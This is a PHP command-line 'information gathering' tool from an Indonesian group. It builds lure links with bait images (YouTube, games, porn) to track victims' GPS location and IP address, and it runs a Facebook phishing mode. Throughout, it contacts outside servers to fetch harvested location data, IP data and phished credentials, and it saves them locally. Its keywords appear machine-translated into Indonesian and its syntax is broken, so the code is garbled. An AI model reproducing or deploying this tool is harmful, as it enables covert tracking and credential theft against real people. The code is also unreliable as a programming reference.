<? php 
/ *
	Penulis: Brilly4n
	Tim: {IndoSec}
	Alat: Pengumpulan Informasi
	Fanspage: https://www.facebook.com/IndoSecOfficial
				{OpenSourceCode}
* /
/ *
	Konfigurasi
* /
$ version  	=  ' 1.0.2 ' ;
$ random  	=  rand ( 123456789 , 6 );
$ file  		=  ' infogath_update.php ' ;
// $ url = 'http: // localhost / tools /';
$ url  		=  ' https://komunitastahajjudberantai.or.id/q/ ' ;
error_reporting ( 0 );
// cek pembaruan
fungsi  diperbarui ( $ versi , $ file )
{
	$ cek  =  file_get_contents ( ' https://brad.josebernard.com/index/version.lst ' );
	$ cek2  =  meledak ( " \ n " , $ cek );
	if ( $ cek2 [ 0 ] ==  $ version ) {
		echo  " \ n [-] Tidak Ada Pembaruan \ n \ n " ;
	} lain {
		echo  " \ n [+] Diperbarui ke versi $ versi \ n [+] $ git clone https://github.com/indosecid/gps_track " ;
	}
}
// cek koneksi
echo  " \ n [+] Mengecek Koneksi Internet ... " ;
// $ cek = get_headers ('https://facebook.com');
// if (! preg_match ('/ 200 /', $ cek [0])) {
	
//  	echo "\ n [+] Koneksi Stabil";
//  	echo "\ n [+] Pembaruan ...";
//  	diperbarui ($ versi, $ file);
// } else {
//  	echo "\ n \ n [-] Tidak Ada Koneksi Internet: '(\ n \ n";
//  	keluar ();
// }
fungsi  tampil ( $ versi )
{
	gema  "
  ___ __ ____ _ _     
| _ _ | _ __ / _ | ___ / ___ | __ _ | | _ | | __  
  | || '_ \ | | _ / _ \ | | _ / _` | __ | '_ \
  | || | | | _ | (_) | | _ | | (_ | | | _ | | |
| ___ | _ | | _ | _ | \ ___ / \ ____ | \ __, _ | \ __ | _ | | _ | v. " . $ versi . "
       => Pengumpulan Informasi <=                                        
Penulis: Brilly4n - {IndoSec}
Hubungi: timtam.rpl@gmail.com
FansPage: https://www.facebook.com/IndoSecOfficial/
	--GPS --IP --PHISING --exit
> " ;
}
fungsi  proses ( $ acak )
{
	echo  " \ n \ n [+] Tautan Dibuat \ n [+] Pelacakan ID: $ acak  \ n [+] Parameter =>:? halaman = " ;
}
function  short_dom ( $ url )
{	
	
	$ ch  =  curl_init ();
	curl_setopt ( $ ch , CURLOPT_URL , ' http://q.sidia.id/z.php ' );
	curl_setopt ( $ ch , CURLOPT_RETURNTRANSFER , 1 );
	curl_setopt ( $ ch , CURLOPT_POSTFIELDS , " url = $ urls " );
	$ x  =  curl_exec ( $ ch );
	echo  $ x ;
}
fungsi  buat_link ( $ input , $ random , $ url , $ id , $ img )
{	
	$  imgs =  base64_encode ( $ img );
	$ random2  =  base64_encode ( $ random );
	$ url  =  $ url . ' home.php? redirect = ' . $ input . ' & halaman = ' . $ random2 . ' & id = ' . $ id . ' & img = ' . $ imgs ;
	
	$ domen_asli  =  base64_encode ( $ urls );
	
	$ url  =  ' Salin Tautan => ' ;
	echo  " \ n \ n [+] $ url " ;
	short_dom ( $ domen_asli );
}
 pengunduhan fungsi ( $ acak , $ url , $ opt , $ port )
{
	echo  file_get_contents ( $ url  .  ' get / '  .  ' GPS_GET ' . $ random . ' .html ' );
	$ curl  =  curl_init ();
	curl_setopt ( $ curl , CURLOPT_URL , $ url . ' gps / ' . $ opt . ' _TRACK_ ' . $ random . ' .html ' );
	curl_setopt ( $ curl , CURLOPT_RETURNTRANSFER , true );
	curl_setopt ( $ curl , CURLOPT_HEADER , false );
	$ data  =  curl_exec ( $ curl );
	curl_close ( $ curl );
	echo  " \ n [+] Mengunduh " ;
	sentuh ( $ opt . ' _TRACK_ ' . $ acak . ' .php ' );
	$ fp  =  fopen ( $ opt . ' _TRACK_ ' . $ random . ' .php ' , ' w ' );
	fwrite ( $ fp , $ data );
	fclose ( $ fp );
	echo  " \ n [+] Membuka File ... " ;
	echo  " \ n \ n [+] Buka Browser =>: http: // localhost: " . $ port ;
	
	// jalankan di localhost
	sistem ( ' php -S localhost: ' . $ port . '  ' . $ opt . ' _TRACK_ ' . $ random . ' .php ' );
}
// phising
fungsi  buat_phising ( $ opsi , $ random , $ url )
{	
	tidur ( 1 );
	$  urls =  base64_encode ( $ url . " welcome.php? opsi = " . base64_encode ( $ opsi ) . " & q = " . $ random );
	echo  " \ n [+] Siap Tautan:> " ;
	short_dom ( $ url );
	// litening
	echo  " \ n \ n [+] Target Mendengarkan < " ;
	$ a  =  1 ; $ z = 1 ;
	untuk ( $ a ; $ a  <  9999 ; $ a ++ ) {
		
		$ cek  =  get_headers ( $ url . " phising / phising_ " . $ random . " .txt " );
		// dengarkan
		if ( ! preg_match ( "/ 200 /" , $ cek [ 0 ])) {
			gema  " = " ;
		} lain {
			$ ambil  =  file_get_contents ( $ url . " phising / phising_ " . $ random . " .txt " );
			
			preg_match_all ( "/ END /" , $ file , $ a );
			$ b  =  count ( $ a [ 0 ]);
			untuk ( $ z ; $ z  <  9999 ; $ z ++ ) {
				$ ambil  =  file_get_contents ( $ url . " phising / phising_ " . $ random . " .txt " );
					
				preg_match_all ( "/ END /" , $ file , $ o );
				$ q  =  count ( $ o [ 0 ]);
				$ r  =  $ q  +  1 ;
				gema  " > \ n [+] " .  $ r  . " Target Di Dapatkan! \ N " ;
				echo  " [+] Membuat File \ n \ n " ;
				$ filesss  =  " phising_ " . $ acak . " .txt " ;
				
				$ o  =  fopen ( $ filesss , ' a ' );
				fwrite ( $ o , $ ambil );
				fclose ( $ o );
				echo  $ ambil . " \ n " ;
				keluar ();
			}
		}
		tidur ( 3 );
	}
}
tampil ( $ version );
$ pilih  =  trim ( fgets ( STDIN ));
if ( $ pilih  ==  ' --GPS '  ||  $ pilih  ==  ' --gps ' ) {
	proses ( $ acak );
	$ input  =  trim ( fgets ( STDIN ));
	// atur port
	echo  " [+] Setel PORT =>: " ;
	$ port  =  trim ( fgets ( STDIN ));
	if ( is_numeric ( $ port )) {
		echo  " \ n (1) Youtube (2) PUBG (3) FreeFire (4) Anime (5) Bokep (6) Kustom? \ n " ;
		echo  " [+] Gunakan Gambar =>: " ;
		$ opsi_img  =  trim ( fgets ( STDIN ));
		beralih ( $ opsi_img ) {
			huruf  ' 1 ' :
				$ img  =  ' https://upload.wikimedia.org/wikipedia/commons/thumb/e/e1/Logo_of_YouTube_%282015-2017%29.svg/1280px--Logo_of_YouTube_%282015-2017%29.svg.png ' ;
				istirahat ;
			huruf  ' 2 ' :
				$ img  =  ' https://res.cloudinary.com/teepublic/image/private/s---xiJeC7t--/t_Preview/b_rgb:191919,c_limit,f_jpg,h_630,q_90,w_630/v1535164327/produksi/design/ 3064946_2000.jpg ' ;
				istirahat ;
			huruf  ' 3 ' :
				$ img  =  ' http://cm1.narvii.com/6653/1c97d673ada4bcca12be337f6909a801c282eaad_00.jpg ' ;
				istirahat ;
			huruf  ' 4 ' :
				$ img  =  ' https://ih0.redbubble.net/image.397474907.7403/mp,550x550,matte,,ffffff,t.3u1...jpg ' ;
				istirahat ;
			huruf  ' 5 ' :
				$ img  =  ' https://chinadailymail.files.wordpress.com/2014/04/22-japanese-girl.jpg?w=640 ' ;
				istirahat ;
			huruf  ' 6 ' :
				echo  " [+] URL Gambar =>: " ;
				$ img  =  trim ( fgets ( STDIN ));
				istirahat ;
			default :
				keluar ();
			istirahat ;
		}
		buat_link ( $ input , $ random , $ url , 1 , $ img );
		// litening
		echo  " \ n \ n [+] Target Mendengarkan < " ;
		$ a  =  1 ;
		untuk ( $ a ; $ a  <  9999 ; $ a ++ ) {
			
			$ cek  =  get_headers ( $ url . ' gps / GPS_TRACK_ ' . $ random . ' .html ' );
			// dengarkan
			if ( ! preg_match ( "/ 200 /" , $ cek [ 0 ])) {
				gema  " = " ;
			} lain {
				echo  " > \ n \ n [+] Target TERTYPU 200 OK " ;
				istirahat ;
			}
			tidur ( 3 );
		}
		// unduh
		unduh ( $ acak , $ url , ' GPS ' , $ port );	
	} lain {
		echo  " \ n \ n [-] PORT Harus Angka: '( \ n \ n " ;
	}
} elseif ( $ pilih  ==  ' --IP '  ||  $ pilih  ==  ' --ip ' ) {
	proses ( $ acak );
	$ input  =  trim ( fgets ( STDIN ));
	echo  " \ n (1) Youtube (2) PUBG (3) FreeFire (4) Anime (5) Bokep (6) Kustom? \ n " ;
	echo  " [+] Gunakan Gambar =>: " ;
	$ opsi_img  =  trim ( fgets ( STDIN ));
	beralih ( $ opsi_img ) {
		huruf  ' 1 ' :
			$ img  =  ' https://upload.wikimedia.org/wikipedia/commons/thumb/e/e1/Logo_of_YouTube_%282015-2017%29.svg/1280px-Logo_of_YouTube_%282015-2017%29.svg.png ' ;
			istirahat ;
		huruf  ' 2 ' :
			$ img  =  ' https://res.cloudinary.com/teepublic/image/private/s---xiJeC7t--/t_Preview/b_rgb:191919,c_limit,f_jpg,h_630,q_90,w_630/v1535164327/produksi/design/ 3064946_0.jpg ' ;
			istirahat ;
		huruf  ' 3 ' :
			$ img  =  ' http://cm1.narvii.com/6653/1c97d673ada4bcca12be337f6909a801c282eaad_00.jpg ' ;
			istirahat ;
		huruf  ' 4 ' :
			$ img  =  ' https://ih0.redbubble.net/image.397474907.7403/mp,550x550,matte,ffffff,t.3u1.jpg ' ;
			istirahat ;
		huruf  ' 5 ' :
			$ img  =  ' https://chinadailymail.files.wordpress.com/2014/04/22-japanese-girl.jpg?w=640 ' ;
			istirahat ;
		huruf  ' 6 ' :
			echo  " [+] URL Gambar =>: " ;
			$ img  =  trim ( fgets ( STDIN ));
			istirahat ;
		default :
			keluar ();
		istirahat ;
	}
	buat_link ( $ input , $ random , $ url , 2 , $ img );
	// litening
	echo  " \ n \ n [+] Target Mendengarkan < " ;
	$ a  =  1 ;
	untuk ( $ a ; $ a  <  9999 ; $ a ++ ) {
		
		$ cek  =  get_headers ( $ url . ' ip / IP_GET ' . $ random . ' .html ' );
		// dengarkan
		if ( ! preg_match ( "/ 200 /" , $ cek [ 0 ])) {
			gema  " = " ;
		} lain {
			gema  " > " ;
			$ file  =  file_get_contents ( $ url . ' ip / IP_GET ' . $ random . ' .html ' );
			echo  $ file ;
			istirahat ;
		}
		tidur ( 3 );
	}
} elseif ( $ pilih  ==  ' --PHISING '  ||  $ pilih  ==  ' --phising ' ) {
	
	echo  " \ n (1). Facebook \ n [+] Masih di Update Gan !!! " ;
	echo  " \ n \ n diterbitkan Pilihan:> " ;
	$ opsi  =  trim ( fgets ( STDIN ));
	if ( $ opsi  ==  1 ) {
		// FB
		echo  " \ n \ n [+] ID Anda: "  .  $ acak  .  " \ n [+] Tautan Buatan: Memuat ... " ;
		buat_phising ( $ opsi , $ random , $ url );
	}
} elseif ( $ pilih  ==  ' --exit ' ) {
	keluar ();
} lain {
	echo  " \ n \ n [-] Kode Kesalahan: '( \ n \ n " ;
	keluar ();
}
? >
